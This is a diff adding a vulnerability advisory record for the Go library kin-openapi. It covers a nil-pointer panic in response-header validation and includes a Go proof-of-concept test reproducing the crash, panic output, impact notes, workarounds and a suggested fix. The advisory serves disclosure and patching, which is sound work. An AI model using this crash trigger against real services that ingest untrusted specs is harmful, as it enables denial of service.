@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-74vm-87hj-r66f",
+  "modified": "2026-10-16T20:15:03.610490637Z",
+  "published": "2026-10-16T19:58:46Z",
+  "aliases": [
+    "CVE-2026-100349"
+  ],
+  "summary": "kin-openapi openapi3filter: nil-pointer panic in ValidateResponse on a response header declared with content",
+  "details": "## Summary\n\n`ValidateResponse` panics on a nil pointer when a spec declares a response header with `content` instead of `schema`. `doc.Validate()` accepts that document, so the crash comes from a spec the library just called valid.\n\nSame class as GHSA-jpcw-4wr7-c3vq, which covered the request-parameter case in v0.144.0; this is the response-header path.\n\nAffects `github.com/getkin/kin-openapi` `\u003c= v0.145.0`. Reproduced on master `947498e5a6bd`, Go 1.26.\n\n## Details\n\nA `content`-typed response header has `headerRef.Value.Schema == nil`.\n\n`validate_response.go:181` passes it straight through:\n\n```go\nif decodedValue, found, err = decodeValue(dec, headerName, sm, headerRef.Value.Schema, headerRef.Value.Required); err != nil {\n```\n\nand `req_resp_decoder.go:273` is where it lands:\n\n```go\nif len(schema.Value.AllOf) \u003e 0 {\n```\n\nTwo things I checked rather than assumed. The response does not need to carry the header; declaring it is enough, and then every call for that operation panics. And the body path is fine, `:114` returns early on a nil schema, so this is headers only. The PoC keeps the body case as a control.\n\n## PoC\n\nDrop into `openapi3filter/` and run:\n\n```\ngo test ./openapi3filter/ -run NilSchema -v\n```\n\n```go\npackage openapi3filter_test\n\nimport (\n\t\"context\"\n\t\"io\"\n\t\"net/http\"\n\t\"net/http/httptest\"\n\t\"strings\"\n\t\"testing\"\n\n\t\"github.com/getkin/kin-openapi/openapi3\"\n\t\"github.com/getkin/kin-openapi/openapi3filter\"\n\t\"github.com/getkin/kin-openapi/routers\"\n)\n\nconst specBody = `\nopenapi: 3.0.3\ninfo: {title: poc, version: \"1.0.0\"}\npaths:\n  /x:\n    get:\n      responses:\n        \"200\":\n          description: ok\n          content:\n            application/json: {}\n`\n\nconst specHeader = `\nopenapi: 3.0.3\ninfo: {title: poc, version: \"1.0.0\"}\npaths:\n  /x:\n    get:\n      responses:\n        \"200\":\n          description: ok\n          headers:\n            X-Thing:\n              content:\n                application/json: {}\n`\n\nfunc validatedInput(t *testing.T, spec string, hdr http.Header) *openapi3filter.ResponseValidationInput {\n\tt.Helper()\n\tdoc, err := openapi3.NewLoader().LoadFromData([]byte(spec))\n\tif err != nil {\n\t\tt.Fatalf(\"load: %v\", err)\n\t}\n\tif err := doc.Validate(context.Background()); err != nil {\n\t\tt.Fatalf(\"doc.Validate rejected the spec, so this repro proves nothing: %v\", err)\n\t}\n\top := doc.Paths.Find(\"/x\").Get\n\treq := httptest.NewRequest(http.MethodGet, \"/x\", nil)\n\treturn \u0026openapi3filter.ResponseValidationInput{\n\t\tRequestValidationInput: \u0026openapi3filter.RequestValidationInput{\n\t\t\tRequest: req,\n\t\t\tRoute:   \u0026routers.Route{Spec: doc, Operation: op, Method: http.MethodGet, Path: \"/x\"},\n\t\t},\n\t\tStatus: 200,\n\t\tHeader: hdr,\n\t\tBody:   io.NopCloser(strings.NewReader(`{}`)),\n\t}\n}\n\n// Control: body path returns early on a nil schema.\nfunc TestControl_ResponseBodyNilSchema(t *testing.T) {\n\tin := validatedInput(t, specBody, http.Header{\"Content-Type\": {\"application/json\"}})\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tt.Errorf(\"body path panicked, expected clean return: %v\", r)\n\t\t}\n\t}()\n\tif err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {\n\t\tt.Errorf(\"body path returned %v, expected nil\", err)\n\t}\n}\n\n// The response does not carry X-Thing. Declaring the header is enough.\nfunc TestResponseHeaderNilSchema(t *testing.T) {\n\tin := validatedInput(t, specHeader, http.Header{\"Content-Type\": {\"application/json\"}})\n\tif err := openapi3filter.ValidateResponse(context.Background(), in); err != nil {\n\t\tt.Fatalf(\"no panic; got err = %v (already fixed?)\", err)\n\t}\n}\n```\n\nOutput:\n\n```\n=== RUN   TestControl_ResponseBodyNilSchema\n--- PASS: TestControl_ResponseBodyNilSchema (0.00s)\n=== RUN   TestResponseHeaderNilSchema\n--- FAIL: TestResponseHeaderNilSchema (0.00s)\npanic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x20 pc=0x7f6d2a]\n\ngithub.com/getkin/kin-openapi/openapi3filter.decodeValue(...)\n\t/src/openapi3filter/req_resp_decoder.go:273 +0x4a\ngithub.com/getkin/kin-openapi/openapi3filter.validateResponseHeader(...)\n\t/src/openapi3filter/validate_response.go:181 +0x146\ngithub.com/getkin/kin-openapi/openapi3filter.ValidateResponse(...)\n\t/src/openapi3filter/validate_response.go:89 +0xafa\n```\n\nThe `FAIL` is the point: control passes, the header case takes the binary down.\n\nRan in a container against a fresh clone of master. I have not tried it against a live proxy.\n\n## Impact\n\nA process crash instead of an error return. Declaring the header is enough, so it is every call on that operation rather than an occasional one.\n\nIf the spec comes from somewhere else -- gateways, linters, anything ingesting specs it did not write -- that is a trust boundary, and it becomes remote availability.\n\nIf it is your own spec, nothing attacker-controlled starts it, but any client reaching that route then crashes the process. It fires on every call, so normally you would see it the first time that route runs. A spec edited without exercising the route is the case where you would not. That is the difference from GHSA-jpcw, where the attacker supplied the trigger. I have left severity unset; the two cases do not score the same.\n\nOn how common it is, I checked rather than guessed. Of roughly 1,500 OpenAPI 3.x specs on apis.guru, one declares content-typed response headers -- VTEX Catalog API -- and not in one corner of it: the shape repeats across its operations, so for that consumer this is not an edge case.\n\nThe header names in it (`X-AspNet-Version`, `p3p`, a few malformed ones) look like a generator emitting `content` where it could not infer a schema, and apis.guru only indexes public specs. There is no content-typed response header in this repo's testdata either.\n\n## Workarounds\n\nUse `schema` on the response header, or skip `ValidateResponse` for those operations. `ExcludeResponseBody` will not do it -- headers are validated before that check.\n\n## Suggested fix\n\nNil-guard at the top of `decodeValue`:\n\n```go\nif schema == nil {\n\treturn nil, false, nil\n}\n```\n\nReturning nil leaves a `content`-typed header unvalidated rather than erroring, so it trades the crash for a silent gap. An error return kills the panic just as well if you would rather it surfaced.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/getkin/kin-openapi",
+        "purl": "pkg:golang/github.com/getkin/kin-openapi"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.146.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.145.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-74vm-87hj-r66f/GHSA-74vm-87hj-r66f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getkin/kin-openapi/security/advisories/GHSA-74vm-87hj-r66f"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100349"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getkin/kin-openapi/commit/f5441d67f855ed34d975b3b85665764644ab1459"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getkin/kin-openapi"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getkin/kin-openapi/releases/tag/v0.146.0"
+    }
+  ]
+}
